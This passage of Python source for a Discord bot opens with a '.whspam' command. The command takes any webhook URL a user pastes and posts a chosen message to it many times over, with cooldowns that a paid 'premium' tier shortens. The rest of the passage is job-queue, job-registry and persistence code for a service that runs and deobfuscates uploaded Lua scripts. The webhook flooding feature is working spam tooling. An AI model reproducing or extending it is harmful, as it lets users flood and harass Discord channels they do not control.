    args = content[len(\".whspam\"):].strip()
    parts = args.split(maxsplit=1)

    url = None
    text = None

    # Format: .whspam <webhook_url> <chat text>
    if parts and parts[0].strip().startswith((\"http://\", \"https://\")):
        url = parts[0].strip()
        text = parts[1].strip() if len(parts) > 1 else \"\"
    elif WEBHOOK_URL:
        # No URL given -> use the saved default webhook, whole args = text
        url = WEBHOOK_URL
        text = args
    else:
        return await _safe_reply(message,
            content=\"`.whspam <webhook_url> <chat>` - give me a webhook url and the message\",
            mention_author=False)

    if not text:
        return await _safe_reply(message,
            content=\"`.whspam <webhook_url> <chat>` - what do you want me to spam?\",
            mention_author=False)

    if \"webhook\" not in url.lower():
        return await _safe_reply(message,
            content=\"that doesn't look like a discord webhook url (it should contain `/api/webhooks/`)\",
            mention_author=False)

    remaining = _whspam_cd(uid)
    if remaining > 0:
        escalated = _whspam_escalated(uid)
        mins = int(remaining // 60)
        secs = int(remaining % 60)
        if escalated:
            embed = discord.Embed(
                description=(f\"you hit the limit **{WHSPAM_ESCALATE_LIMIT}x in 1 hour** so your \"
                             f\"cooldown got raised - wait **{mins}m {secs}s**\"),
                color=WARN)
        else:
            embed = discord.Embed(
                description=f\"`.whspam` again in **{mins}m {secs}s** - premium cuts this to 60s\",
                color=WARN)
        embed.set_footer(text=_make_footer())
        return await _safe_reply(message, embed=embed, mention_author=False)

    _whspam_record(uid)

    s = await _safe_reply(message, content=f\"{EMOJI_LOADING} spamming webhook...\")
    try:
        sent = await _send_webhook_spam(url, text)
        embed = discord.Embed(
            description=f\"sent **{sent}/{WHSPAM_COUNT}** webhook messages\",
            color=GOOD if sent else BAD)
        embed.set_footer(text=_make_footer())
        await s.delete()
        await _safe_reply(message, embed=embed, mention_author=False)
    except Exception as e:
        try:
            em = discord.Embed(
                description=f\"{EMOJI_FAIL} {TIMEOUT_ERROR}\",
                color=BAD)
            em.set_footer(text=_make_footer())
            await _safe_edit(s, content=None, embed=em)
        except Exception:
            pass

# =========================
# HARD MAX TIMEOUT
# =========================
HARD_MAX_TIMEOUT = 120
# Never put unbounded engine output or raw subprocess tracebacks into Discord.
MAX_INPUT_BYTES = 8 * 1024 * 1024
MAX_OUTPUT_BYTES = 8 * 1024 * 1024
TIMEOUT_ERROR = \"Timed out - script might be in an infinite loop\"
OBF_SYNTAX_ERROR = \"Syntax error, script cannot run. Check your syntax first son\"
PROMDEOBF_ERROR = \"script does not seems like Prometheus obf/wearedevs\"
MOONSEC_ERROR = \"script does not seems like moonsec\"
LURAPH_ERROR = \"script doesn't seems like luraph\"

# Shared processing queue. Premium users are placed ahead of standard
# waiters, while the active processing limit remains global.
MAX_CONCURRENT_JOBS = 8
_job_state_lock = asyncio.Lock()
_pending_jobs = 0
_running_jobs = 0
_job_waiters = []
_job_sequence = 0

async def _wake_next_job_locked():
    \"\"\"Transfer one free processing slot to the highest-priority waiter.\"\"\"
    global _pending_jobs, _running_jobs
    while _job_waiters and _running_jobs < MAX_CONCURRENT_JOBS:
        _priority, _sequence, future = heapq.heappop(_job_waiters)
        if future.cancelled():
            _pending_jobs = max(0, _pending_jobs - 1)
            continue
        _pending_jobs = max(0, _pending_jobs - 1)
        _running_jobs += 1
        future.set_result(True)
        return


async def _enter_job_queue(priority: int = 0) -> int:
    \"\"\"Reserve a shared slot; premium waiters are served first.\"\"\"
    global _pending_jobs, _running_jobs, _job_sequence
    loop = asyncio.get_running_loop()
    future = loop.create_future()
    priority = 1 if priority else 0
    async with _job_state_lock:
        # Do not bypass an existing waiter, otherwise a newly arriving
        # standard job could jump ahead of a premium job already queued.
        if _running_jobs < MAX_CONCURRENT_JOBS and not _job_waiters:
            _running_jobs += 1
            return _running_jobs
        _job_sequence += 1
        _pending_jobs += 1
        heapq.heappush(_job_waiters, (-priority, _job_sequence, future))
        position = _running_jobs + _pending_jobs
    try:
        await future
        return position
    except BaseException:
        async with _job_state_lock:
            # If the future was already granted, the slot was transferred to
            # this waiter; hand it to another waiter instead of losing it.
            granted = future.done() and not future.cancelled()
            if not granted:
                if not future.done():
                    future.cancel()
                # Remove a cancelled waiter immediately so pending counts and
                # later priority ordering stay accurate.
                for index, (_p, _s, queued_future) in enumerate(_job_waiters):
                    if queued_future is future:
                        _job_waiters.pop(index)
                        heapq.heapify(_job_waiters)
                        _pending_jobs = max(0, _pending_jobs - 1)
                        break
            if granted:
                _running_jobs = max(0, _running_jobs - 1)
                await _wake_next_job_locked()
        raise


async def _leave_job_queue():
    global _running_jobs
    async with _job_state_lock:
        _running_jobs = max(0, _running_jobs - 1)
        await _wake_next_job_locked()


async def _run_queued_job(factory, priority: int = 0):
    \"\"\"Run one coroutine through the shared priority queue.\"\"\"
    position = await _enter_job_queue(priority=priority)
    try:
        return position, await factory()
    finally:
        await _leave_job_queue()


async def _job_queue_snapshot() -> tuple:
    async with _job_state_lock:
        return _running_jobs, _pending_jobs


# Durable queue state for .l jobs. Only message/source references are stored;
# source contents are fetched from Discord again during restoration.
def _read_queue_records_sync() -> list:
    try:
        if not QUEUE_STATE_FILE.exists():
            return []
        data = json.loads(QUEUE_STATE_FILE.read_text(encoding=\"utf-8\"))
        return data if isinstance(data, list) else []
    except Exception as e:
        print(f\"[Queue] state load failed: {e}\")
        return []


def _write_queue_records_sync(records: list):
    tmp_path = QUEUE_STATE_FILE.with_suffix(\".tmp\")
    tmp_path.write_text(json.dumps(records, indent=2), encoding=\"utf-8\")
    os.replace(tmp_path, QUEUE_STATE_FILE)


async def _persist_l_job_record(record: dict) -> bool:
    async with _queue_persist_lock:
        records = _read_queue_records_sync()
        records = [r for r in records if r.get(\"id\") != record.get(\"id\")]
        records.append(record)
        try:
            _write_queue_records_sync(records)
            return True
        except Exception as e:
            print(f\"[Queue] state write failed: {e}\")
            return False


async def _remove_persisted_queue_ids(ids) -> None:
    ids = {str(value) for value in ids if value is not None}
    if not ids:
        return
    async with _queue_persist_lock:
        records = _read_queue_records_sync()
        remaining = [r for r in records if str(r.get(\"id\")) not in ids]
        if len(remaining) != len(records):
            try:
                _write_queue_records_sync(remaining)
            except Exception as e:
                print(f\"[Queue] state cleanup failed: {e}\")


async def _replace_persisted_queue_records(records: list) -> None:
    async with _queue_persist_lock:
        try:
            _write_queue_records_sync(records)
        except Exception as e:
            print(f\"[Queue] state replace failed: {e}\")


def _make_l_job_record(message, job: dict, batch_id: str) -> dict:
    attachment = job.get(\"att\")
    if job.get(\"url\"):
        source_type = \"url\"
    elif attachment is not None:
        source_type = \"attachment\"
    elif job.get(\"reply_source\"):
        # Keep replied plain-code jobs recoverable across restarts; the raw
        # inline text is intentionally not stored in durable queue state.
        source_type = \"reply\"
    elif job.get(\"inline\") is not None:
        source_type = \"inline\"
    else:
        source_type = \"reply\"
    persist_id = job.get(\"persist_id\") or f\"{int(time.time() * 1000)}-{random.randint(0, 999999999)}\"
    job[\"persist_id\"] = persist_id
    job[\"batch_id\"] = batch_id
    return {
        \"id\": persist_id,
        \"batch_id\": batch_id,
        \"source_type\": source_type,
        \"user_id\": int(message.author.id),
        \"message_id\": int(getattr(message, \"id\", 0) or 0),
        \"channel_id\": int(getattr(message.channel, \"id\", 0) or 0),
        \"guild_id\": int(message.guild.id) if getattr(message, \"guild\", None) else None,
        \"name\": str(job.get(\"name\") or \"dump.lua\")[:200],
        \"url\": job.get(\"url\"),
        \"attachment_id\": int(getattr(attachment, \"id\", 0) or 0) if attachment is not None else None,
        \"reference_id\": int(getattr(getattr(message, \"reference\", None), \"message_id\", 0) or 0) or None,
    }


async def _enqueue_l_jobs(message, jobs: list, state: dict) -> None:
    \"\"\"Persist each .l job before placing it in the in-memory queue.\"\"\"
    if dump_queue is None:
        raise RuntimeError(\"processing queue is not ready\")
    batch_id = f\"{message.author.id}-{int(time.time() * 1000)}-{random.randint(0, 999999)}\"
    state[\"batch_id\"] = batch_id
    state[\"command\"] = \".l\"
    state[\"total\"] = len(jobs)
    state[\"completed\"] = 0
    state[\"remaining\"] = len(jobs)
    state[\"queue_position\"] = \"waiting\"
    state[\"persisted_ids\"] = set()
    _job_bind_message(state, message)
    _job_set_command(state, \".l\")
    state[\"job_ids\"] = [state[\"job_id\"]]
    for index, job in enumerate(jobs):
        job[\"message\"] = message
        job[\"timeout\"] = HARD_MAX_TIMEOUT
        job[\"user_job_state\"] = state
        job_id = state[\"job_id\"] if index == 0 else _new_job_id()
        if index > 0:
            state[\"job_ids\"].append(job_id)
            _job_create(job_id, message.author.id, state.get(\"user_tag\", \"\"))
        job[\"job_id\"] = job_id
        job[\"persist_id\"] = job_id
        record = _make_l_job_record(message, job, batch_id)
        if not await _persist_l_job_record(record):
            raise RuntimeError(\"could not persist queue state\")
        source_type = (\"url\" if job.get(\"url\") else
                       \"attachment\" if job.get(\"att\") is not None else
                       \"reply\" if job.get(\"reply_source\") else \"inline\")
        if job.get(\"inline\") is not None:
            input_summary = _job_input_summary(job.get(\"inline\"), source=source_type,
                                               filename=job.get(\"name\"), url=job.get(\"url\"))
        else:
            input_summary = {
                \"source\": source_type,
                \"filename\": str(job.get(\"name\") or \"\"),
                \"url\": str(job.get(\"url\") or \"\"),
                \"size\": None,
                \"sha256\": \"\",
                \"preview\": \"[source queued; content will be recorded when the job starts]\",
            }
        _job_update(job_id, command=\".l\", user_tag=state.get(\"user_tag\", \"\"),
                    guild_id=state.get(\"guild_id\"), input=input_summary, status=\"queued\")
        state[\"persisted_ids\"].add(record[\"id\"])
        await dump_queue.put(job)


async def _restore_persisted_l_jobs() -> int:
    \"\"\"Restore queued .l jobs whose originating Discord message still exists.\"\"\"
    if dump_queue is None:
        return 0
    records = _read_queue_records_sync()
    if not records:
        return 0
    valid_records = []
    restored_jobs = []
    for record in records:
        try:
            channel_id = int(record.get(\"channel_id\") or 0)
            message_id = int(record.get(\"message_id\") or 0)
            channel = bot.get_channel(channel_id) or await bot.fetch_channel(channel_id)
            message = await channel.fetch_message(message_id)
            if int(message.author.id) != int(record.get(\"user_id\")):
                continue
            source_type = record.get(\"source_type\")
            attachment = None
            inline = None
            url = record.get(\"url\") if source_type == \"url\" else None
            if source_type == \"attachment\":
                wanted = int(record.get(\"attachment_id\") or 0)
                attachment = next((a for a in message.attachments if int(getattr(a, \"id\", 0)) == wanted), None)
                if attachment is None:
                    continue
            elif source_type == \"inline\":
                content = getattr(message, \"content\", \"\") or \"\"
                match = LUA_CODEBLOCK.search(content)
                inline = match.group(1).strip() if match else content[2:].strip()
                if not inline or not _source_within_input_limit(inline):
                    continue
            elif source_type == \"reply\":
                reference_id = int(record.get(\"reference_id\") or 0)
                if not reference_id:
                    continue
                referenced = await channel.fetch_message(reference_id)
                inline = await extract_lua_from(referenced)
                if not inline or not _source_within_input_limit(inline):
                    continue
            elif not url:
                continue
            persisted_id = str(record.get(\"id\") or \"\").upper()
            if not re.fullmatch(r\"KVMS-JOB-[A-Z0-9]{4}-[A-Z0-9]{4}\", persisted_id):
                # Migrate legacy durable descriptors so every queued item now
                # carries the same externally searchable job ID format.
                persisted_id = _new_job_id()
                record[\"id\"] = persisted_id
            job = {
                \"name\": str(record.get(\"name\") or \"dump.lua\"),
                \"att\": attachment,
                \"url\": url,
                \"inline\": inline,
                \"message\": message,
                \"timeout\": HARD_MAX_TIMEOUT,
                \"persist_id\": persisted_id,
                \"batch_id\": str(record.get(\"batch_id\") or persisted_id),
            }
            valid_records.append(record)
            restored_jobs.append((record, job))
        except Exception as e:
            print(f\"[Queue] could not restore job: {e}\")
    # Drop stale records, but keep valid records durable until their worker
    # actually starts.
    await _replace_persisted_queue_records(valid_records)
    groups = {}
    for record, job in restored_jobs:
        key = (str(record.get(\"batch_id\") or record.get(\"id\")), int(record.get(\"user_id\")))
        groups.setdefault(key, []).append((record, job))
    restored = 0
    for (_batch_id, user_id), entries in groups.items():
        first_id = str(entries[0][0].get(\"id\") or \"\").upper()
        if not re.fullmatch(r\"KVMS-JOB-[A-Z0-9]{4}-[A-Z0-9]{4}\", first_id):
            first_id = None
        state = await _claim_user_job(user_id, job_id=first_id)
        if state is None:
            continue
        state[\"batch_id\"] = _batch_id
        state[\"command\"] = \".l\"
        state[\"total\"] = len(entries)
        state[\"completed\"] = 0
        state[\"remaining\"] = len(entries)
        state[\"queue_position\"] = \"waiting\"
        state[\"persisted_ids\"] = set()
        state[\"job_ids\"] = []
        try:
            for index, (record, job) in enumerate(entries):
                persisted_id = str(record.get(\"id\"))
                job_id = persisted_id.upper()
                if not re.fullmatch(r\"KVMS-JOB-[A-Z0-9]{4}-[A-Z0-9]{4}\", job_id):
                    job_id = _new_job_id()
                if index == 0:
                    state[\"job_id\"] = job_id
                state[\"job_ids\"].append(job_id)
                _job_create(job_id, user_id)
                _job_update(job_id, command=\".l\", status=\"queued\")
                job[\"job_id\"] = job_id
                job[\"user_job_state\"] = state
                state[\"persisted_ids\"].add(persisted_id)
                await dump_queue.put(job)
                restored += 1
        except BaseException:
            await _cancel_user_job(user_id)
            raise
    return restored


# =========================
# PRIVATE JOB REGISTRY / JOB IDS
# =========================
JOB_REGISTRY_FILE = ROOT / \"job_registry.json\"
JOB_REGISTRY_LIMIT = 1000
_JOB_ID_ALPHABET = string.ascii_uppercase + string.digits
_job_registry_lock = threading.RLock()


def _load_job_registry() -> dict:
    try:
        if JOB_REGISTRY_FILE.exists():
            data = json.loads(JOB_REGISTRY_FILE.read_text(encoding=\"utf-8\"))
            if isinstance(data, dict):
                return {str(k).upper(): v for k, v in data.items()
                        if isinstance(v, dict) and re.fullmatch(
                            r\"KVMS-JOB-[A-Z0-9]{4}-[A-Z0-9]{4}\", str(k).upper())}
    except Exception as e:
        print(f\"[Jobs] Registry load error: {e}\")
    return {}


def _save_job_registry_locked():
    try:
        JOB_REGISTRY_FILE.write_text(json.dumps(job_registry, indent=2), encoding=\"utf-8\")
    except Exception as e:
        print(f\"[Jobs] Registry save error: {e}\")


job_registry: dict = _load_job_registry()
_issued_job_ids = set(job_registry.keys())


def _new_job_id() -> str:
    with _job_registry_lock:
        while True:
            first = \"\".join(random.choices(_JOB_ID_ALPHABET, k=4))
            second = \"\".join(random.choices(_JOB_ID_ALPHABET, k=4))
            job_id = f\"KVMS-JOB-{first}-{second}\"
            if job_id not in job_registry and job_id not in _issued_job_ids:
                _issued_job_ids.add(job_id)
                return job_id


def _job_trim_registry_locked():
    if len(job_registry) <= JOB_REGISTRY_LIMIT:
        return
    ordered = sorted(job_registry.items(),
                     key=lambda item: float(item[1].get(\"created_at\", 0) or 0))
    for old_id, _record in ordered[:-JOB_REGISTRY_LIMIT]:
        job_registry.pop(old_id, None)


def _job_create(job_id: str, user_id: int, user_tag: str = \"\"):
    if not job_id:
        return
    job_id = str(job_id).upper()
    now = time.time()
    with _job_registry_lock:
        record = job_registry.setdefault(job_id, {
            \"job_id\": job_id,
            \"created_at\": now,
            \"status\": \"queued\",
            \"command\": \"unknown\",
            \"user_id\": int(user_id),
            \"user_tag\": str(user_tag or \"\"),
            \"guild_id\": None,
            \"input\": {},
            \"output\": {},
            \"error\": \"\",
            \"visibility\": \"owner-only\",
            \"hidden\": True,
            \"secret\": True,
        })
        record[\"user_id\"] = int(user_id)
        if user_tag:
            record[\"user_tag\"] = str(user_tag)
        record[\"updated_at\"] = now
        _job_trim_registry_locked()
        _save_job_registry_locked()


def _job_update(job_id: str, **fields):
    if not job_id:
        return
    job_id = str(job_id).upper()
    with _job_registry_lock:
        record = job_registry.get(job_id)
        if record is None:
            return
        record.update(fields)
        record[\"updated_at\"] = time.time()
        _job_trim_registry_locked()
        _save_job_registry_locked()


def _job_input_summary(value, source: str = \"unknown\", filename: str = None,
                       url: str = None) -> dict:
    if isinstance(value, bytes):
        raw = bytes(value)
        text = raw.decode(\"utf-8\", errors=\"ignore\")
    else:
        text = str(value or \"\")
        raw = text.encode(\"utf-8\", errors=\"ignore\")
    masked_text = _mask_host_ip_leaks(text)
    preview = masked_text[:1200]
    result = {
        \"source\": str(source or \"unknown\"),
        \"filename\": str(filename or \"\"),
        \"url\": str(url or \"\"),
        \"size\": len(raw),
        \"sha256\": hashlib.sha256(raw).hexdigest(),
        \"preview\": preview,
    }
    if b\"\\x00\" in raw[:4096]:
        result[\"preview\"] = \"[binary input; SHA-256 and size recorded]\"
    return result


def _job_output_summary(value, filename: str = None) -> dict:
    if isinstance(value, bytes):
        raw = bytes(value)
        text = raw.decode(\"utf-8\", errors=\"ignore\")
    else:
        text = str(value or \"\")
        raw = text.encode(\"utf-8\", errors=\"ignore\")
    masked_text = _mask_host_ip_leaks(text)
    preview = masked_text[:1200]
    return {
        \"filename\": str(filename or \"\"),
        \"size\": len(raw),
        \"sha256\": hashlib.sha256(raw).hexdigest(),
        \"preview\": preview if preview else \"[empty output]\",
    }


def _job_bind_message(state: dict, message):
    if not state or message is None:
        return
    state[\"user_tag\"] = str(getattr(message.author, \"display_name\", None) or
                             getattr(message.author, \"name\", None) or
                             getattr(message.author, \"mention\", \"\") or \"\")
    state[\"guild_id\"] = (int(message.guild.id)
                          if getattr(message, \"guild\", None) is not None else None)
    for job_id in state.get(\"job_ids\") or [state.get(\"job_id\")]:
        _job_update(job_id, user_tag=state[\"user_tag\"], guild_id=state[\"guild_id\"])


def _job_set_command(state: dict, command: str):
    if not state:
        return
    state[\"command\"] = command
    ids = state.get(\"job_ids\") or [state.get(\"job_id\")]
    for job_id in ids:
        _job_update(job_id, command=command)


def _job_set_input(state: dict, value, source: str = \"unknown\",
                   filename: str = None, url: str = None):
    if not state:
        return
    summary = _job_input_summary(value, source=source, filename=filename, url=url)
    state[\"input\"] = summary
    ids = state.get(\"job_ids\") or [state.get(\"job_id\")]
    for job_id in ids[:1]:
        _job_update(job_id, input=summary, status=\"processing\")


def _job_set_output(state: dict, value, filename: str = None,
                    error: str = \"\", status: str = \"completed\"):
    if not state:
        return
    summary = _job_output_summary(value, filename=filename) if value is not None else {}
    state[\"output\"] = summary
    state[\"error\"] = str(error or \"\")
    state[\"job_status\"] = status
    elapsed = max(0.0, time.time() - float(state.get(\"started_at\") or time.time()))
    state[\"duration_seconds\"] = round(elapsed, 3)
    ids = state.get(\"job_ids\") or [state.get(\"job_id\")]
    for job_id in ids[:1]:
        _job_update(job_id, output=summary, error=str(error or \"\"), status=status,
                    duration_seconds=round(elapsed, 3))


def _job_mark_status(state: dict, status: str, error: str = \"\"):
    if not state:
        return
    state[\"job_status\"] = status
    state[\"error\"] = str(error or \"\")
    elapsed = max(0.0, time.time() - float(state.get(\"started_at\") or time.time()))
    state[\"duration_seconds\"] = round(elapsed, 3)
    for job_id in state.get(\"job_ids\") or [state.get(\"job_id\")]:
        _job_update(job_id, status=status, error=str(error or \"\"),
                    duration_seconds=round(elapsed, 3))


def _job_source_info(message, content: str, command: str, filename: str = None):
    \"\"\"Describe the source without retaining a raw secret or full script.\"\"\"
    if any(getattr(att, \"filename\", \"\").lower().endswith((\".lua\", \".luau\", \".txt\"))
           for att in getattr(message, \"attachments\", []) or []):
        return \"attachment\", filename or \"attached source\", None
    if getattr(message, \"reference\", None):
        return \"reply\", filename or \"replied source\", None
    after = content[len(command):].strip() if content.lower().startswith(command) else \"\"
    if after.startswith((\"http://\", \"https://\")):
        return \"url\", filename or \"url source\", after.split()[0].rstrip(\".,)`'\\\\\\\"\")
    return \"inline\", filename or \"inline source\", None


# One active/queued job per user. A state object is used so .cancel can stop
# both jobs already running and jobs that are still waiting for a slot.
_user_job_states = {}
_user_job_lock = asyncio.Lock()

async def _user_job_busy(user_id: int) -> bool:
    async with _user_job_lock:
        return user_id in _user_job_states


async def _user_job_snapshot(user_id: int):
    async with _user_job_lock:
        state = _user_job_states.get(user_id)
        if state is None:
            return None
        return {
            key: state.get(key)
            for key in (\"command\", \"queue_position\", \"priority\", \"total\",
                        \"completed\", \"remaining\", \"cancelled\", \"started_at\",
                        \"batch_id\", \"job_id\", \"job_ids\")
        }


async def _claim_user_job(user_id: int, job_id: str = None):
    async with _user_job_lock:
        if user_id in _user_job_states:
            return None
        state = {
            \"user_id\": user_id,
            \"remaining\": 1,
            \"cancelled\": False,
            \"tasks\": set(),
            \"status\": None,
            \"command\": None,
            \"queue_position\": None,
            \"priority\": 0,
            \"total\": 1,
            \"completed\": 0,
            \"started_at\": time.time(),
            \"persisted_ids\": set(),
            \"job_id\": job_id or _new_job_id(),
            \"job_ids\": [],
            \"job_status\": \"processing\",
            \"input\": {},
            \"output\": {},
            \"error\": \"\",
        }
        state[\"job_ids\"] = [state[\"job_id\"]]
        _job_create(state[\"job_id\"], user_id)
        current = asyncio.current_task()
        if current is not None:
            state[\"tasks\"].add(current)
        _user_job_states[user_id] = state
        return state


async def _register_user_job_task(state: dict) -> bool:
    async with _user_job_lock:
        if state.get(\"cancelled\"):
            return False
        current = asyncio.current_task()
        if current is not None:
            state[\"tasks\"].add(current)
        return True


async def _finish_user_job(state: dict):
    async with _user_job_lock:
        current = asyncio.current_task()
        if current is not None:
            state[\"tasks\"].discard(current)
        state[\"remaining\"] = max(0, state.get(\"remaining\", 1) - 1)
        if state[\"remaining\"] == 0 and _user_job_states.get(state[\"user_id\"]) is state:
            _user_job_states.pop(state[\"user_id\"], None)


async def _cancel_user_job(user_id: int) -> bool:
    async with _user_job_lock:
        state = _user_job_states.get(user_id)
        if state is None:
            return False
        state[\"cancelled\"] = True
        tasks = list(state.get(\"tasks\", set()))
        status = state.get(\"status\")
        persisted_ids = set(state.get(\"persisted_ids\", set()))
    _job_mark_status(state, \"cancelled\", \"cancellation requested\")
    current = asyncio.current_task()
    to_wait = []
    for task in tasks:
        if task is not None and task is not current and not task.done():
            task.cancel()
            to_wait.append(task)
    if to_wait:
        await asyncio.gather(*to_wait, return_exceptions=True)
    await _remove_persisted_queue_ids(persisted_ids)
    if status is not None:
        try:
            await status.edit(content=\"cancelled\", embed=None)
        except Exception:
            pass
    # A task may have been cancelled before it reached its registration
    # coroutine. Do not leave a phantom reservation behind once every task
    # associated with this state has stopped.
    current = asyncio.current_task()
    async with _user_job_lock:
        if (_user_job_states.get(user_id) is state and
                not any(t is not None and t is not current and not t.done()
                        for t in state.get(\"tasks\", set()))):
            _user_job_states.pop(user_id, None)
    return True


async def _cancel_all_user_jobs() -> int:
    async with _user_job_lock:
        user_ids = list(_user_job_states.keys())
    cancelled = 0
    for user_id in user_ids:
        if await _cancel_user_job(user_id):
            cancelled += 1
    return cancelled


JOB_COOLDOWN_SECONDS = 10
_job_cooldowns = {}


def _job_cooldown_remaining(user_id: int, command: str) -> float:
    last = _job_cooldowns.get((user_id, command), 0.0)
    return max(0.0, JOB_COOLDOWN_SECONDS - (time.time() - last))


def _set_job_cooldown(user_id: int, command: str):
    _job_cooldowns[(user_id, command)] = time.time()


executor = ThreadPoolExecutor(max_workers=8)

# =========================
# PATHS & CONSTANTS
# =========================
LUTE = ROOT / \"lute.exe\"
TMP  = ROOT / \"bot_tmp\"
TMP.mkdir(exist_ok=True)
PROXIES_FILE = ROOT / \"proxies.txt\"

MAX_DL  = 8 * 1024 * 1024
OK_EXT  = (\".lua\", \".txt\", \".luau\")

ACCENT = 0x2b2d31
GOOD   = 0x57F287
BAD    = 0xED4245
WARN   = 0xFEE75C

URL_RE  = re.compile(r\"https?://[^\\s<>()]+\", re.I)
TIME_RE = re.compile(r\"Finished processing in ([\\d.]+) seconds\", re.I)

# Prevent scripts that query api.ipify.org (or print the host address directly)
# from exposing the bot host IP in returned code/files. The environment value
# can override the default when the host changes.
HOST_IP_FALLBACK = \"ðŸ¤¡\"
HOST_IP_TO_MASK = os.getenv(\"HOST_IP_TO_MASK\", HOST_IP_FALLBACK).strip() or HOST_IP_FALLBACK
IP_MASK_EMOJI = \"Ÿ\"
IPIFY_LOOKUP_RE = re.compile(r\"https?://(?:www\\.)?api\\.ipify\\.org(?:[/?#\\s\\\"'`)]|$)\", re.I)

def _mask_host_ip_leaks(text: str) -> str:
    if not isinstance(text, str) or not text or not HOST_IP_TO_MASK:
        return text
    try:
        tokens = {HOST_IP_TO_MASK, HOST_IP_FALLBACK}
        tokens = [re.escape(token) for token in tokens if token]
        pattern = rf\"(?<![0-9.])(?:{'|'.join(tokens)})(?![0-9.])\"
        return re.sub(pattern, IP_MASK_EMOJI, text)
    except (TypeError, re.error):
        return text

def _mask_host_ip_bytes(data: bytes) -> bytes:
    if not isinstance(data, (bytes, bytearray)) or not data:
        return data
    try:
        text = bytes(data).decode(\"utf-8\")
    except UnicodeDecodeError:
        return data
    return _mask_host_ip_leaks(text).encode(\"utf-8\")

def _source_within_input_limit(value: str) -> bool:
    try:
        return isinstance(value, str) and len(value.encode(\"utf-8\")) <= MAX_INPUT_BYTES
    except Exception:
        return False


def _validate_upload_url(value: str) -> bool:
    \"\"\"Accept only bounded, absolute HTTP(S) URLs for `.upload`.\"\"\"
    if not isinstance(value, str):
        return False
    value = value.strip()
    if not value or len(value) > 2048 or any(ord(ch) < 32 for ch in value):
        return False
    try:
        parsed = urlsplit(value)
        if parsed.scheme.lower() not in {\"http\", \"https\"}:
            return False
        if not parsed.netloc or not parsed.hostname:
            return False
        # Credentials in a pasted URL are both unsafe and almost always a typo.
        if parsed.username is not None or parsed.password is not None:
            return False
        _ = parsed.port  # force malformed ports to raise ValueError
        return True
    except (TypeError, ValueError):
        return False

# Discord links should never show up in the \"urls found\" footer
DISCORD_URL_RE = re.compile(r\"(discord\\.(gg|com)|discordapp\\.(com|net))\", re.I)

LUNE_RUNTIME = \"/home/container/lune\"
LUNE_BIN = str(ROOT / \"lune\")

# =========================
# OBFUSCATOR DETECTION DB
# =========================
OBFUSCATOR_DB_FILE = ROOT / \"obfuscators.json\"

# Built-in obfuscator knowledge (always available).
def _valid_obf_name(name: str) -> bool:
    # Keep only sane obfuscator names so a corrupted key (e.g. a stray
    # regex or url from a bad .inpdtc call) never shows up in .help.
    if not name or not isinstance(name, str):
        return False
    name = name.strip()
    if len(name) > 40:
        return False
    if any(c in name for c in (\"\\\\\", \"[\", \"]\", \"{\", \"}\", \"/\", \"<\", \">\", \"(\", \")\")):
        return False
    if name.startswith(\"-\"):
        return False
    return bool(name)


def _load_obfuscator_db() -> dict:
    # DB starts EMPTY. The owner fills it via .inpdtc, and it is persisted
    # to obfuscators.json. Corrupted/insane keys are dropped on load.
    db = {}
    try:
        if OBFUSCATOR_DB_FILE.exists():
            data = json.loads(OBFUSCATOR_DB_FILE.read_text(encoding=\"utf-8\"))
            if isinstance(data, dict):
                for k, v in data.items():
                    if _valid_obf_name(k):
                        db[k] = v
    except Exception as e:
        print(f\"[ObfDB] Load error: {e}\")
    return db

OBF_DB_MAX_BYTES = 2 * 1024 * 1024
OBF_BACKUP_COUNT = 3
OBF_BACKUP_MAX_BYTES = OBF_DB_MAX_BYTES


def _obf_backup_path(index: int = 0) -> pathlib.Path:
    suffix = \".bak\" if index == 0 else f\".bak.{index}\"
    return pathlib.Path(str(OBFUSCATOR_DB_FILE) + suffix)


def _copy_bounded_atomic(source: pathlib.Path, destination: pathlib.Path) -> bool:
    destination_tmp = None
    try:
        if not source.exists() or source.stat().st_size > OBF_BACKUP_MAX_BYTES:
            return False
        destination_tmp = destination.with_name(
            f\".{destination.name}.{os.getpid()}.{secrets.token_hex(4)}.tmp\")
        with source.open(\"rb\") as src, destination_tmp.open(\"wb\") as dst:
            shutil.copyfileobj(src, dst, length=64 * 1024)
            dst.flush()
            os.fsync(dst.fileno())
        os.replace(destination_tmp, destination)
        return True
    except Exception as e:
        try:
            if destination_tmp is not None:
                destination_tmp.unlink(missing_ok=True)
        except Exception:
            pass
        print(f\"[ObfDB] Backup error: {e}\")
        return False


def _save_obfuscator_db(d: dict) -> bool:
    \"\"\"Persist detector metadata with a bounded atomic rotating backup.

    Only the bounded database representation is written. A failed backup does
    not block a valid atomic database replacement, while an oversized payload
    is rejected before touching the existing database.
    \"\"\"
    temporary = None
    try:
        payload = json.dumps(d, indent=2, ensure_ascii=False).encode(\"utf-8\")
        if len(payload) > OBF_DB_MAX_BYTES:
            print(\"[ObfDB] Save refused: database exceeds bounded size\")
            return False
        OBFUSCATOR_DB_FILE.parent.mkdir(parents=True, exist_ok=True)
        temporary = OBFUSCATOR_DB_FILE.with_name(
            f\".{OBFUSCATOR_DB_FILE.name}.{os.getpid()}.{secrets.token_hex(4)}.tmp\")
        with temporary.open(\"wb\") as handle:
            handle.write(payload)
            handle.flush()
            os.fsync(handle.fileno())
        # Rotate only bounded backups and make the current-file backup with an
        # atomic replace, before replacing the live database.
        for index in range(OBF_BACKUP_COUNT - 1, 0, -1):
            old_path = _obf_backup_path(index - 1)
            new_path = _obf_backup_path(index)
            if old_path.exists():
                os.replace(old_path, new_path)
        # Remove backups from older deployments so retention stays bounded.
        for stale in OBFUSCATOR_DB_FILE.parent.glob(OBFUSCATOR_DB_FILE.name + \".bak.*\"):
            try:
                suffix = stale.name.rsplit(\".bak.\", 1)[1]
                if suffix.isdigit() and int(suffix) >= OBF_BACKUP_COUNT:
                    stale.unlink(missing_ok=True)
            except Exception:
                pass
        if OBFUSCATOR_DB_FILE.exists() and not _copy_bounded_atomic(
                OBFUSCATOR_DB_FILE, _obf_backup_path(0)):
            print(\"[ObfDB] Save refused: current database backup failed\")
            return False
        os.replace(temporary, OBFUSCATOR_DB_FILE)
        temporary = None
        return True
    except Exception as e:
        print(f\"[ObfDB] Save error: {e}\")
        return False
    finally:
        if temporary is not None:
            try:
                temporary.unlink(missing_ok=True)
            except Exception:
                pass

obfuscator_db: dict = _load_obfuscator_db()

# Detection intentionally samples multiple 100-character regions. A marker that
# appears only in one accidental comment or common word should not outweigh the
# rest of the script.
DETECTION_WINDOW_SIZE = 100
_DETECTION_WEAK_PATTERNS = {
    \"loadstring\", \"string\", \"stringdump\", \"string.dump\", \"function\", \"local\",
